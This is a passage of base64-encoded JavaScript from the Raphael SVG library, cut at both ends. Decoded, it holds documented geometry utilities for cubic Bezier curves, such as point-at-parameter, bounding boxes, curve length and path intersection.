5jaG9yIG9mIHRoZSBjdXJ2ZVxuICAgICAtIGMxeSAobnVtYmVyKSB5IG9mIHRoZSBmaXJzdCBhbmNob3Igb2YgdGhlIGN1cnZlXG4gICAgIC0gYzJ4IChudW1iZXIpIHggb2YgdGhlIHNlY29uZCBhbmNob3Igb2YgdGhlIGN1cnZlXG4gICAgIC0gYzJ5IChudW1iZXIpIHkgb2YgdGhlIHNlY29uZCBhbmNob3Igb2YgdGhlIGN1cnZlXG4gICAgIC0gcDJ4IChudW1iZXIpIHggb2YgdGhlIHNlY29uZCBwb2ludCBvZiB0aGUgY3VydmVcbiAgICAgLSBwMnkgKG51bWJlcikgeSBvZiB0aGUgc2Vjb25kIHBvaW50IG9mIHRoZSBjdXJ2ZVxuICAgICAtIHQgKG51bWJlcikgcG9zaXRpb24gb24gdGhlIGN1cnZlICgwLi4xKVxuICAgICA9IChvYmplY3QpIHBvaW50IGluZm9ybWF0aW9uIGluIGZvcm1hdDpcbiAgICAgbyB7XG4gICAgIG8gICAgIHg6IChudW1iZXIpIHggY29vcmRpbmF0ZSBvZiB0aGUgcG9pbnRcbiAgICAgbyAgICAgeTogKG51bWJlcikgeSBjb29yZGluYXRlIG9mIHRoZSBwb2ludFxuICAgICBvICAgICBtOiB7XG4gICAgIG8gICAgICAgICB4OiAobnVtYmVyKSB4IGNvb3JkaW5hdGUgb2YgdGhlIGxlZnQgYW5jaG9yXG4gICAgIG8gICAgICAgICB5OiAobnVtYmVyKSB5IGNvb3JkaW5hdGUgb2YgdGhlIGxlZnQgYW5jaG9yXG4gICAgIG8gICAgIH1cbiAgICAgbyAgICAgbjoge1xuICAgICBvICAgICAgICAgeDogKG51bWJlcikgeCBjb29yZGluYXRlIG9mIHRoZSByaWdodCBhbmNob3JcbiAgICAgbyAgICAgICAgIHk6IChudW1iZXIpIHkgY29vcmRpbmF0ZSBvZiB0aGUgcmlnaHQgYW5jaG9yXG4gICAgIG8gICAgIH1cbiAgICAgbyAgICAgc3RhcnQ6IHtcbiAgICAgbyAgICAgICAgIHg6IChudW1iZXIpIHggY29vcmRpbmF0ZSBvZiB0aGUgc3RhcnQgb2YgdGhlIGN1cnZlXG4gICAgIG8gICAgICAgICB5OiAobnVtYmVyKSB5IGNvb3JkaW5hdGUgb2YgdGhlIHN0YXJ0IG9mIHRoZSBjdXJ2ZVxuICAgICBvICAgICB9XG4gICAgIG8gICAgIGVuZDoge1xuICAgICBvICAgICAgICAgeDogKG51bWJlcikgeCBjb29yZGluYXRlIG9mIHRoZSBlbmQgb2YgdGhlIGN1cnZlXG4gICAgIG8gICAgICAgICB5OiAobnVtYmVyKSB5IGNvb3JkaW5hdGUgb2YgdGhlIGVuZCBvZiB0aGUgY3VydmVcbiAgICAgbyAgICAgfVxuICAgICBvICAgICBhbHBoYTogKG51bWJlcikgYW5nbGUgb2YgdGhlIGN1cnZlIGRlcml2YXRpdmUgYXQgdGhlIHBvaW50XG4gICAgIG8gfVxuICAgIFxcKi9cbiAgICBSLmZpbmREb3RzQXRTZWdtZW50ID0gZnVuY3Rpb24gKHAxeCwgcDF5LCBjMXgsIGMxeSwgYzJ4LCBjMnksIHAyeCwgcDJ5LCB0KSB7XG4gICAgICAgIHZhciB0MSA9IDEgLSB0LFxuICAgICAgICAgICAgdDEzID0gcG93KHQxLCAzKSxcbiAgICAgICAgICAgIHQxMiA9IHBvdyh0MSwgMiksXG4gICAgICAgICAgICB0MiA9IHQgKiB0LFxuICAgICAgICAgICAgdDMgPSB0MiAqIHQsXG4gICAgICAgICAgICB4ID0gdDEzICogcDF4ICsgdDEyICogMyAqIHQgKiBjMXggKyB0MSAqIDMgKiB0ICogdCAqIGMyeCArIHQzICogcDJ4LFxuICAgICAgICAgICAgeSA9IHQxMyAqIHAxeSArIHQxMiAqIDMgKiB0ICogYzF5ICsgdDEgKiAzICogdCAqIHQgKiBjMnkgKyB0MyAqIHAyeSxcbiAgICAgICAgICAgIG14ID0gcDF4ICsgMiAqIHQgKiAoYzF4IC0gcDF4KSArIHQyICogKGMyeCAtIDIgKiBjMXggKyBwMXgpLFxuICAgICAgICAgICAgbXkgPSBwMXkgKyAyICogdCAqIChjMXkgLSBwMXkpICsgdDIgKiAoYzJ5IC0gMiAqIGMxeSArIHAxeSksXG4gICAgICAgICAgICBueCA9IGMxeCArIDIgKiB0ICogKGMyeCAtIGMxeCkgKyB0MiAqIChwMnggLSAyICogYzJ4ICsgYzF4KSxcbiAgICAgICAgICAgIG55ID0gYzF5ICsgMiAqIHQgKiAoYzJ5IC0gYzF5KSArIHQyICogKHAyeSAtIDIgKiBjMnkgKyBjMXkpLFxuICAgICAgICAgICAgYXggPSB0MSAqIHAxeCArIHQgKiBjMXgsXG4gICAgICAgICAgICBheSA9IHQxICogcDF5ICsgdCAqIGMxeSxcbiAgICAgICAgICAgIGN4ID0gdDEgKiBjMnggKyB0ICogcDJ4LFxuICAgICAgICAgICAgY3kgPSB0MSAqIGMyeSArIHQgKiBwMnksXG4gICAgICAgICAgICBhbHBoYSA9ICg5MCAtIG1hdGguYXRhbjIobXggLSBueCwgbXkgLSBueSkgKiAxODAgLyBQSSk7XG4gICAgICAgIChteCA+IG54IHx8IG15IDwgbnkpICYmIChhbHBoYSArPSAxODApO1xuICAgICAgICByZXR1cm4ge1xuICAgICAgICAgICAgeDogeCxcbiAgICAgICAgICAgIHk6IHksXG4gICAgICAgICAgICBtOiB7eDogbXgsIHk6IG15fSxcbiAgICAgICAgICAgIG46IHt4OiBueCwgeTogbnl9LFxuICAgICAgICAgICAgc3RhcnQ6IHt4OiBheCwgeTogYXl9LFxuICAgICAgICAgICAgZW5kOiB7eDogY3gsIHk6IGN5fSxcbiAgICAgICAgICAgIGFscGhhOiBhbHBoYVxuICAgICAgICB9O1xuICAgIH07XG4gICAgLypcXFxuICAgICAqIFJhcGhhZWwuYmV6aWVyQkJveFxuICAgICBbIG1ldGhvZCBdXG4gICAgICoqXG4gICAgICogVXRpbGl0eSBtZXRob2RcbiAgICAgKipcbiAgICAgKiBSZXR1cm4gYm91bmRpbmcgYm94IG9mIGEgZ2l2ZW4gY3ViaWMgYmV6aWVyIGN1cnZlXG4gICAgID4gUGFyYW1ldGVyc1xuICAgICAtIHAxeCAobnVtYmVyKSB4IG9mIHRoZSBmaXJzdCBwb2ludCBvZiB0aGUgY3VydmVcbiAgICAgLSBwMXkgKG51bWJlcikgeSBvZiB0aGUgZmlyc3QgcG9pbnQgb2YgdGhlIGN1cnZlXG4gICAgIC0gYzF4IChudW1iZXIpIHggb2YgdGhlIGZpcnN0IGFuY2hvciBvZiB0aGUgY3VydmVcbiAgICAgLSBjMXkgKG51bWJlcikgeSBvZiB0aGUgZmlyc3QgYW5jaG9yIG9mIHRoZSBjdXJ2ZVxuICAgICAtIGMyeCAobnVtYmVyKSB4IG9mIHRoZSBzZWNvbmQgYW5jaG9yIG9mIHRoZSBjdXJ2ZVxuICAgICAtIGMyeSAobnVtYmVyKSB5IG9mIHRoZSBzZWNvbmQgYW5jaG9yIG9mIHRoZSBjdXJ2ZVxuICAgICAtIHAyeCAobnVtYmVyKSB4IG9mIHRoZSBzZWNvbmQgcG9pbnQgb2YgdGhlIGN1cnZlXG4gICAgIC0gcDJ5IChudW1iZXIpIHkgb2YgdGhlIHNlY29uZCBwb2ludCBvZiB0aGUgY3VydmVcbiAgICAgKiBvclxuICAgICAtIGJleiAoYXJyYXkpIGFycmF5IG9mIHNpeCBwb2ludHMgZm9yIGJlemllciBjdXJ2ZVxuICAgICA9IChvYmplY3QpIHBvaW50IGluZm9ybWF0aW9uIGluIGZvcm1hdDpcbiAgICAgbyB7XG4gICAgIG8gICAgIG1pbjoge1xuICAgICBvICAgICAgICAgeDogKG51bWJlcikgeCBjb29yZGluYXRlIG9mIHRoZSBsZWZ0IHBvaW50XG4gICAgIG8gICAgICAgICB5OiAobnVtYmVyKSB5IGNvb3JkaW5hdGUgb2YgdGhlIHRvcCBwb2ludFxuICAgICBvICAgICB9XG4gICAgIG8gICAgIG1heDoge1xuICAgICBvICAgICAgICAgeDogKG51bWJlcikgeCBjb29yZGluYXRlIG9mIHRoZSByaWdodCBwb2ludFxuICAgICBvICAgICAgICAgeTogKG51bWJlcikgeSBjb29yZGluYXRlIG9mIHRoZSBib3R0b20gcG9pbnRcbiAgICAgbyAgICAgfVxuICAgICBvIH1cbiAgICBcXCovXG4gICAgUi5iZXppZXJCQm94ID0gZnVuY3Rpb24gKHAxeCwgcDF5LCBjMXgsIGMxeSwgYzJ4LCBjMnksIHAyeCwgcDJ5KSB7XG4gICAgICAgIGlmICghUi5pcyhwMXgsIFwiYXJyYXlcIikpIHtcbiAgICAgICAgICAgIHAxeCA9IFtwMXgsIHAxeSwgYzF4LCBjMXksIGMyeCwgYzJ5LCBwMngsIHAyeV07XG4gICAgICAgIH1cbiAgICAgICAgdmFyIGJib3ggPSBjdXJ2ZURpbS5hcHBseShudWxsLCBwMXgpO1xuICAgICAgICByZXR1cm4ge1xuICAgICAgICAgICAgeDogYmJveC5taW4ueCxcbiAgICAgICAgICAgIHk6IGJib3gubWluLnksXG4gICAgICAgICAgICB4MjogYmJveC5tYXgueCxcbiAgICAgICAgICAgIHkyOiBiYm94Lm1heC55LFxuICAgICAgICAgICAgd2lkdGg6IGJib3gubWF4LnggLSBiYm94Lm1pbi54LFxuICAgICAgICAgICAgaGVpZ2h0OiBiYm94Lm1heC55IC0gYmJveC5taW4ueVxuICAgICAgICB9O1xuICAgIH07XG4gICAgLypcXFxuICAgICAqIFJhcGhhZWwuaXNQb2ludEluc2lkZUJCb3hcbiAgICAgWyBtZXRob2QgXVxuICAgICAqKlxuICAgICAqIFV0aWxpdHkgbWV0aG9kXG4gICAgICoqXG4gICAgICogUmV0dXJucyBgdHJ1ZWAgaWYgZ2l2ZW4gcG9pbnQgaXMgaW5zaWRlIGJvdW5kaW5nIGJveGVzLlxuICAgICA+IFBhcmFtZXRlcnNcbiAgICAgLSBiYm94IChzdHJpbmcpIGJvdW5kaW5nIGJveFxuICAgICAtIHggKHN0cmluZykgeCBjb29yZGluYXRlIG9mIHRoZSBwb2ludFxuICAgICAtIHkgKHN0cmluZykgeSBjb29yZGluYXRlIG9mIHRoZSBwb2ludFxuICAgICA9IChib29sZWFuKSBgdHJ1ZWAgaWYgcG9pbnQgaW5zaWRlXG4gICAgXFwqL1xuICAgIFIuaXNQb2ludEluc2lkZUJCb3ggPSBmdW5jdGlvbiAoYmJveCwgeCwgeSkge1xuICAgICAgICByZXR1cm4geCA+PSBiYm94LnggJiYgeCA8PSBiYm94LngyICYmIHkgPj0gYmJveC55ICYmIHkgPD0gYmJveC55MjtcbiAgICB9O1xuICAgIC8qXFxcbiAgICAgKiBSYXBoYWVsLmlzQkJveEludGVyc2VjdFxuICAgICBbIG1ldGhvZCBdXG4gICAgICoqXG4gICAgICogVXRpbGl0eSBtZXRob2RcbiAgICAgKipcbiAgICAgKiBSZXR1cm5zIGB0cnVlYCBpZiB0d28gYm91bmRpbmcgYm94ZXMgaW50ZXJzZWN0XG4gICAgID4gUGFyYW1ldGVyc1xuICAgICAtIGJib3gxIChzdHJpbmcpIGZpcnN0IGJvdW5kaW5nIGJveFxuICAgICAtIGJib3gyIChzdHJpbmcpIHNlY29uZCBib3VuZGluZyBib3hcbiAgICAgPSAoYm9vbGVhbikgYHRydWVgIGlmIHRoZXkgaW50ZXJzZWN0XG4gICAgXFwqL1xuICAgIFIuaXNCQm94SW50ZXJzZWN0ID0gZnVuY3Rpb24gKGJib3gxLCBiYm94Mikge1xuICAgICAgICB2YXIgaSA9IFIuaXNQb2ludEluc2lkZUJCb3g7XG4gICAgICAgIHJldHVybiBpKGJib3gyLCBiYm94MS54LCBiYm94MS55KVxuICAgICAgICAgICAgfHwgaShiYm94MiwgYmJveDEueDIsIGJib3gxLnkpXG4gICAgICAgICAgICB8fCBpKGJib3gyLCBiYm94MS54LCBiYm94MS55MilcbiAgICAgICAgICAgIHx8IGkoYmJveDIsIGJib3gxLngyLCBiYm94MS55MilcbiAgICAgICAgICAgIHx8IGkoYmJveDEsIGJib3gyLngsIGJib3gyLnkpXG4gICAgICAgICAgICB8fCBpKGJib3gxLCBiYm94Mi54MiwgYmJveDIueSlcbiAgICAgICAgICAgIHx8IGkoYmJveDEsIGJib3gyLngsIGJib3gyLnkyKVxuICAgICAgICAgICAgfHwgaShiYm94MSwgYmJveDIueDIsIGJib3gyLnkyKVxuICAgICAgICAgICAgfHwgKGJib3gxLnggPCBiYm94Mi54MiAmJiBiYm94MS54ID4gYmJveDIueCB8fCBiYm94Mi54IDwgYmJveDEueDIgJiYgYmJveDIueCA+IGJib3gxLngpXG4gICAgICAgICAgICAmJiAoYmJveDEueSA8IGJib3gyLnkyICYmIGJib3gxLnkgPiBiYm94Mi55IHx8IGJib3gyLnkgPCBiYm94MS55MiAmJiBiYm94Mi55ID4gYmJveDEueSk7XG4gICAgfTtcbiAgICBmdW5jdGlvbiBiYXNlMyh0LCBwMSwgcDIsIHAzLCBwNCkge1xuICAgICAgICB2YXIgdDEgPSAtMyAqIHAxICsgOSAqIHAyIC0gOSAqIHAzICsgMyAqIHA0LFxuICAgICAgICAgICAgdDIgPSB0ICogdDEgKyA2ICogcDEgLSAxMiAqIHAyICsgNiAqIHAzO1xuICAgICAgICByZXR1cm4gdCAqIHQyIC0gMyAqIHAxICsgMyAqIHAyO1xuICAgIH1cbiAgICBmdW5jdGlvbiBiZXpsZW4oeDEsIHkxLCB4MiwgeTIsIHgzLCB5MywgeDQsIHk0LCB6KSB7XG4gICAgICAgIGlmICh6ID09IG51bGwpIHtcbiAgICAgICAgICAgIHogPSAxO1xuICAgICAgICB9XG4gICAgICAgIHogPSB6ID4gMSA/IDEgOiB6IDwgMCA/IDAgOiB6O1xuICAgICAgICB2YXIgejIgPSB6IC8gMixcbiAgICAgICAgICAgIG4gPSAxMixcbiAgICAgICAgICAgIFR2YWx1ZXMgPSBbLTAuMTI1MiwwLjEyNTIsLTAuMzY3OCwwLjM2NzgsLTAuNTg3MywwLjU4NzMsLTAuNzY5OSwwLjc2OTksLTAuOTA0MSwwLjkwNDEsLTAuOTgxNiwwLjk4MTZdLFxuICAgICAgICAgICAgQ3ZhbHVlcyA9IFswLjI0OTEsMC4yNDkxLDAuMjMzNSwwLjIzMzUsMC4yMDMyLDAuMjAzMiwwLjE2MDEsMC4xNjAxLDAuMTA2OSwwLjEwNjksMC4wNDcyLDAuMDQ3Ml0sXG4gICAgICAgICAgICBzdW0gPSAwO1xuICAgICAgICBmb3IgKHZhciBpID0gMDsgaSA8IG47IGkrKykge1xuICAgICAgICAgICAgdmFyIGN0ID0gejIgKiBUdmFsdWVzW2ldICsgejIsXG4gICAgICAgICAgICAgICAgeGJhc2UgPSBiYXNlMyhjdCwgeDEsIHgyLCB4MywgeDQpLFxuICAgICAgICAgICAgICAgIHliYXNlID0gYmFzZTMoY3QsIHkxLCB5MiwgeTMsIHk0KSxcbiAgICAgICAgICAgICAgICBjb21iID0geGJhc2UgKiB4YmFzZSArIHliYXNlICogeWJhc2U7XG4gICAgICAgICAgICBzdW0gKz0gQ3ZhbHVlc1tpXSAqIG1hdGguc3FydChjb21iKTtcbiAgICAgICAgfVxuICAgICAgICByZXR1cm4gejIgKiBzdW07XG4gICAgfVxuICAgIGZ1bmN0aW9uIGdldFRhdExlbih4MSwgeTEsIHgyLCB5MiwgeDMsIHkzLCB4NCwgeTQsIGxsKSB7XG4gICAgICAgIGlmIChsbCA8IDAgfHwgYmV6bGVuKHgxLCB5MSwgeDIsIHkyLCB4MywgeTMsIHg0LCB5NCkgPCBsbCkge1xuICAgICAgICAgICAgcmV0dXJuO1xuICAgICAgICB9XG4gICAgICAgIHZhciB0ID0gMSxcbiAgICAgICAgICAgIHN0ZXAgPSB0IC8gMixcbiAgICAgICAgICAgIHQyID0gdCAtIHN0ZXAsXG4gICAgICAgICAgICBsLFxuICAgICAgICAgICAgZSA9IC4wMTtcbiAgICAgICAgbCA9IGJlemxlbih4MSwgeTEsIHgyLCB5MiwgeDMsIHkzLCB4NCwgeTQsIHQyKTtcbiAgICAgICAgd2hpbGUgKGFicyhsIC0gbGwpID4gZSkge1xuICAgICAgICAgICAgc3RlcCAvPSAyO1xuICAgICAgICAgICAgdDIgKz0gKGwgPCBsbCA/IDEgOiAtMSkgKiBzdGVwO1xuICAgICAgICAgICAgbCA9IGJlemxlbih4MSwgeTEsIHgyLCB5MiwgeDMsIHkzLCB4NCwgeTQsIHQyKTtcbiAgICAgICAgfVxuICAgICAgICByZXR1cm4gdDI7XG4gICAgfVxuICAgIGZ1bmN0aW9uIGludGVyc2VjdCh4MSwgeTEsIHgyLCB5MiwgeDMsIHkzLCB4NCwgeTQpIHtcbiAgICAgICAgaWYgKFxuICAgICAgICAgICAgbW1heCh4MSwgeDIpIDwgbW1pbih4MywgeDQpIHx8XG4gICAgICAgICAgICBtbWluKHgxLCB4MikgPiBtbWF4KHgzLCB4NCkgfHxcbiAgICAgICAgICAgIG1tYXgoeTEsIHkyKSA8IG1taW4oeTMsIHk0KSB8fFxuICAgICAgICAgICAgbW1pbih5MSwgeTIpID4gbW1heCh5MywgeTQpXG4gICAgICAgICkge1xuICAgICAgICAgICAgcmV0dXJuO1xuICAgICAgICB9XG4gICAgICAgIHZhciBueCA9ICh4MSAqIHkyIC0geTEgKiB4MikgKiAoeDMgLSB4NCkgLSAoeDEgLSB4MikgKiAoeDMgKiB5NCAtIHkzICogeDQpLFxuICAgICAgICAgICAgbnkgPSAoeDEgKiB5MiAtIHkxICogeDIpICogKHkzIC0geTQpIC0gKHkxIC0geTIpICogKHgzICogeTQgLSB5MyAqIHg0KSxcbiAgICAgICAgICAgIGRlbm9taW5hdG9yID0gKHgxIC0geDIpICogKHkzIC0geTQpIC0gKHkxIC0geTIpICogKHgzIC0geDQpO1xuXG4gICAgICAgIGlmICghZGVub21pbmF0b3IpIHtcbiAgICAgICAgICAgIHJldHVybjtcbiAgICAgICAgfVxuICAgICAgICB2YXIgcHggPSBueCAvIGRlbm9taW5hdG9yLFxuICAgICAgICAgICAgcHkgPSBueSAvIGRlbm9taW5hdG9yLFxuICAgICAgICAgICAgcHgyID0gK3B4LnRvRml4ZWQoMiksXG4gICAgICAgICAgICBweTIgPSArcHkudG9GaXhlZCgyKTtcbiAgICAgICAgaWYgKFxuICAgICAgICAgICAgcHgyIDwgK21taW4oeDEsIHgyKS50b0ZpeGVkKDIpIHx8XG4gICAgICAgICAgICBweDIgPiArbW1heCh4MSwgeDIpLnRvRml4ZWQoMikgfHxcbiAgICAgICAgICAgIHB4MiA8ICttbWluKHgzLCB4NCkudG9GaXhlZCgyKSB8fFxuICAgICAgICAgICAgcHgyID4gK21tYXgoeDMsIHg0KS50b0ZpeGVkKDIpIHx8XG4gICAgICAgICAgICBweTIgPCArbW1pbih5MSwgeTIpLnRvRml4ZWQoMikgfHxcbiAgICAgICAgICAgIHB5MiA+ICttbWF4KHkxLCB5MikudG9GaXhlZCgyKSB8fFxuICAgICAgICAgICAgcHkyIDwgK21taW4oeTMsIHk0KS50b0ZpeGVkKDIpIHx8XG4gICAgICAgICAgICBweTIgPiArbW1heCh5MywgeTQpLnRvRml4ZWQoMilcbiAgICAgICAgKSB7XG4gICAgICAgICAgICByZXR1cm47XG4gICAgICAgIH1cbiAgICAgICAgcmV0dXJuIHt4OiBweCwgeTogcHl9O1xuICAgIH1cbiAgICBmdW5jdGlvbiBpbnRlcihiZXoxLCBiZXoyKSB7XG4gICAgICAgIHJldHVybiBpbnRlckhlbHBlcihiZXoxLCBiZXoyKTtcbiAgICB9XG4gICAgZnVuY3Rpb24gaW50ZXJDb3VudChiZXoxLCBiZXoyKSB7XG4gICAgICAgIHJldHVybiBpbnRlckhlbHBlcihiZXoxLCBiZXoyLCAxKTtcbiAgICB9XG4gICAgZnVuY3Rpb24gaW50ZXJIZWxwZXIoYmV6MSwgYmV6MiwganVzdENvdW50KSB7XG4gICAgICAgIHZhciBiYm94MSA9IFIuYmV6aWVyQkJveChiZXoxKSxcbiAgICAgICAgICAgIGJib3gyID0gUi5iZXppZXJCQm94KGJlejIpO1xuICAgICAgICBpZiAoIVIuaXNCQm94SW50ZXJzZWN0KGJib3gxLCBiYm94MikpIHtcbiAgICAgICAgICAgIHJldHVybiBqdXN0Q291bnQgPyAwIDogW107XG4gICAgICAgIH1cbiAgICAgICAgdmFyIGwxID0gYmV6bGVuLmFwcGx5KDAsIGJlejEpLFxuICAgICAgICAgICAgbDIgPSBiZXpsZW4uYXBwbHkoMCwgYmV6MiksXG4gICAgICAgICAgICBuMSA9IG1tYXgofn4obDEgLyA1KSwgMSksXG4gICAgICAgICAgICBuMiA9IG1tYXgofn4obDIgLyA1KSwgMSksXG4gICAgICAgICAgICBkb3RzMSA9IFtdLFxuICAgICAgICAgICAgZG90czIgPSBbXSxcbiAgICAgICAgICAgIHh5ID0ge30sXG4gICAgICAgICAgICByZXMgPSBqdXN0Q291bnQgPyAwIDogW107XG4gICAgICAgIGZvciAodmFyIGkgPSAwOyBpIDwgbjEgKyAxOyBpKyspIHtcbiAgICAgICAgICAgIHZhciBwID0gUi5maW5kRG90c0F0U2VnbWVudC5hcHBseShSLCBiZXoxLmNvbmNhdChpIC8gbjEpKTtcbiAgICAgICAgICAgIGRvdHMxLnB1c2goe3g6IHAueCwgeTogcC55LCB0OiBpIC8gbjF9KTtcbiAgICAgICAgfVxuICAgICAgICBmb3IgKGkgPSAwOyBpIDwgbjIgKyAxOyBpKyspIHtcbiAgICAgICAgICAgIHAgPSBSLmZpbmREb3RzQXRTZWdtZW50LmFwcGx5KFIsIGJlejIuY29uY2F0KGkgLyBuMikpO1xuICAgICAgICAgICAgZG90czIucHVzaCh7eDogcC54LCB5OiBwLnksIHQ6IGkgLyBuMn0pO1xuICAgICAgICB9XG4gICAgICAgIGZvciAoaSA9IDA7IGkgPCBuMTsgaSsrKSB7XG4gICAgICAgICAgICBmb3IgKHZhciBqID0gMDsgaiA8IG4yOyBqKyspIHtcbiAgICAgICAgICAgICAgICB2YXIgZGkgPSBkb3RzMVtpXSxcbiAgICAgICAgICAgICAgICAgICAgZGkxID0gZG90czFbaSArIDFdLFxuICAgICAgICAgICAgICAgICAgICBkaiA9IGRvdHMyW2pdLFxuICAgICAgICAgICAgICAgICAgICBkajEgPSBkb3RzMltqICsgMV0sXG4gICAgICAgICAgICAgICAgICAgIGNpID0gYWJzKGRpMS54IC0gZGkueCkgPCAuMDAxID8gXCJ5XCIgOiBcInhcIixcbiAgICAgICAgICAgICAgICAgICAgY2ogPSBhYnMoZGoxLnggLSBkai54KSA8IC4wMDEgPyBcInlcIiA6IFwieFwiLFxuICAgICAgICAgICAgICAgICAgICBpcyA9IGludGVyc2VjdChkaS54LCBkaS55LCBkaTEueCwgZGkxLnksIGRqLngsIGRqLnksIGRqMS54LCBkajEueSk7XG4gICAgICAgICAgICAgICAgaWYgKGlzKSB7XG4gICAgICAgICAgICAgICAgICAgIGlmICh4eVtpcy54LnRvRml4ZWQoNCldID09IGlzLnkudG9GaXhlZCg0KSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgY29udGludWU7XG4gICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgeHlbaXMueC50b0ZpeGVkKDQpXSA9IGlzLnkudG9GaXhlZCg0KTtcbiAgICAgICAgICAgICAgICAgICAgdmFyIHQxID0gZGkudCArIGFicygoaXNbY2ldIC0gZGlbY2ldKSAvIChkaTFbY2ldIC0gZGlbY2ldKSkgKiAoZGkxLnQgLSBkaS50KSxcbiAgICAgICAgICAgICAgICAgICAgICAgIHQyID0gZGoudCArIGFicygoaXNbY2pdIC0gZGpbY2pdKSAvIChkajFbY2pdIC0gZGpbY2pdKSkgKiAoZGoxLnQgLSBkai50KTtcbiAgICAgICAgICAgICAgICAgICAgaWYgKHQxID49IDAgJiYgdDEgPD0gMS4wMDEgJiYgdDIgPj0gMCAmJiB0MiA8PSAxLjAwMSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGp1c3RDb3VudCkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlcysrO1xuICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXMucHVzaCh7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHg6IGlzLngsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHk6IGlzLnksXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHQxOiBtbWluKHQxLCAxKSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdDI6IG1taW4odDIsIDEpXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICB9XG4gICAgICAgIH1cbiAgICAgICAgcmV0dXJuIHJlcztcbiAgICB9XG4gICAgLypcXFxuICAgICAqIFJhcGhhZWwucGF0aEludGVyc2VjdGlvblxuICAgICBbIG1ldGhvZCBdXG4gICAgICoqXG4gICAgICogVXRpbGl0eSBtZXRob2RcbiAgICAgKipcbiAgICAgKiBGaW5kcyBpbnRlcnNlY3Rpb25zIG9mIHR3byBwYXRoc1xuICAgICA+IFBhcmFtZXRlcnNcbiAgICAgLSBwYXRoMSAoc3RyaW5nKSBwYXRoIHN0cmluZ1xuICAgICAtIHBhdGgyIChzdHJpbmcpIHBhdGggc3RyaW5nXG4gICAgID0gKGFycmF5KSBkb3RzIG9mIGludGVyc2VjdGlvblxuICAgICBvIFtcbiAgICAgbyAgICAge1xuICAgICBvICAgICAgICAgeDogKG51bWJlcikgeCBjb29yZGluYXRlIG9mIHRoZSBwb2ludFxuICAgICBvICAgICAgICAgeTogKG51bWJlcikgeSBjb29yZGluYXRlIG9mIHRoZSBwb2ludFxuICAgICBvICAgICAgICAgdDE6IChudW1iZXIpIHQgdmFsdWUgZm9yIHNlZ21lbnQgb2YgcGF0aDFcbiAgICAgbyAgICAgICAgIHQyOiAobnVtYmVyKSB0IHZhbHVlIGZvciBzZWdtZW50IG9mIHBhdGgyXG4gICAgIG8gICAgICAgICBzZWdtZW50MTogKG51bWJlcikgb3JkZXIgbnVtYmVyIGZvciBzZWdtZW50IG9mIHBhdGgxXG4gICAgIG8gICAgICAgICBzZWdtZW50MjogKG51bWJlcikgb3JkZXIgbnVtYmVyIGZvciBzZWdtZW50IG9mIHBhdGgyXG4gICAgIG8gICAgICAgICBiZXoxOiAoYXJyYXkpIGVpZ2h0IGNvb3JkaW5hdGVzIHJlcHJlc2VudGluZyBiZXppw6lyIGN1cnZlIGZvciB0aGUgc2VnbWVudCBvZiBwYXRoMVxuICAgICBvICAgICAgICAgYmV6MjogKGFycmF5KSBlaWdodCBjb29yZGluYXRlcyByZXByZXNlbnRpbmcgYmV6acOpciBjdXJ2ZSBmb3IgdGhlIHNlZ21lbnQgb2YgcGF0aDJcbiAgICAgbyAgICAgfVxuICAgICBvIF1cbiAgICBcXCovXG4gICAgUi5wYXRoSW50ZXJzZWN0aW9uID0gZnVuY3Rpb24gKHBhdGgxLCBwYXRoMikge1xuICAgICAgICByZXR1cm4gaW50ZXJQYXRoSGVscGVyKHBhdGgxLCBwYXRoMik7XG4gICAgfTtcbiAgICBSLnBhdGhJbnRlcnNlY3Rpb25OdW1iZXIgPSBmdW5jdGlvbiAocGF0aDEsIHBhdGgyKSB7XG4gICAgICAgIHJldHVybiBpbnRlclBhdGhIZWxwZXIocGF0aDEsIHBhdGgyLCAxKTtcbiAgICB9O1xuICAgIGZ1bmN0aW9uIGludGVyUGF0aEhlbHBlcihwYXRoMSwgcGF0aDIsIGp1c3RDb3VudCkge1xuICAgICAgICBwYXRoMSA9IFIuX3BhdGgyY3VydmUocGF0aDEpO1xuICAgICAgICBwYXRoMiA9IFIuX3BhdGgyY3VydmUocGF0aDIpO1xuICAgICAgICB2YXIgeDEsIHkxLCB4MiwgeTIsIHgxbSwgeTFtLCB4Mm0sIHkybSwgYmV6MSwgYmV6MixcbiAgICAgICAgICAgIHJlcyA9IGp1c3RDb3VudCA/IDAgOiBbXTtcbiAgICAgICAgZm9yICh2YXIgaSA9IDAsIGlpID0gcGF0aDEubGVuZ3RoOyBpIDwgaWk7IGkrKykge1xuICAgICAgICAgICAgdmFyIHBpID0gcGF0aDFbaV07XG4gICAgICAgICAgICBpZiAocGlbMF0gPT0gXCJNXCIpIHtcbiAgICAgICAgICAgICAgICB4MSA9IHgxbSA9IHBpWzFdO1xuICAgICAgICAgICAgICAgIHkxID0geTFtID0gcGlbMl07XG4gICAgICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgICAgIGlmIChwaVswXSA9PSBcIkNcIikge1xuICAgICAgICAgICAgICAgICAgICBiZXoxID0gW3gxLCB5MV0uY29uY2F0KHBpLnNsaWNlKDEpKTtcbiAgICAgICAgICAgICAgICAgICAgeDEgPSBiZXoxWzZdO1xuICAgICAgICAgICAgICAgICAgICB5MSA9IGJlejFbN107XG4gICAgICAgICAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgICAgICAgICAgYmV6MSA9IFt4MSwgeTEsIHgxLCB5MSwgeDFtLCB5MW0sIHgxbSwgeTFtXTtcbiAgICAgICAgICAgICAgICAgICAgeDEgPSB4MW07XG4gICAgICAgICAgICAgICAgICAgIHkxID0geTFtO1xuICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICBmb3IgKHZhciBqID0gMCwgamogPSBwYXRoMi5sZW5ndGg7I